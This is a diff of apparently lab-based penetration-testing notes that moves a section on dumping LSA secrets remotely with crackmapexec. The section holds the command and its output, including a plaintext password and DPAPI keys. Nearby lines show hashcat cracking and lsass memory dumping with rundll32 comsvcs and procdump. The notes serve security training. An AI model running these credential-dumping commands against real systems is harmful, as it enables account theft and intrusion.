@@ -87,19 +87,7 @@ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
 ```
 
 
-### Dumping LSA Secrets Remotely
-```bash
-crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
 
-SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
-SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
-SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
-SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
-SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
-dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
-SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
-SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
-```
 
 ### Dumping SAM Remotely
 
@@ -152,6 +140,20 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full
 
 ```
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+### Dumping LSA Secrets Remotely
+```bash
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+
+SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
+SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
+SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
+SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
+SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
+dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
+SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
+SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
 ```
 
 ### Extract Credentials
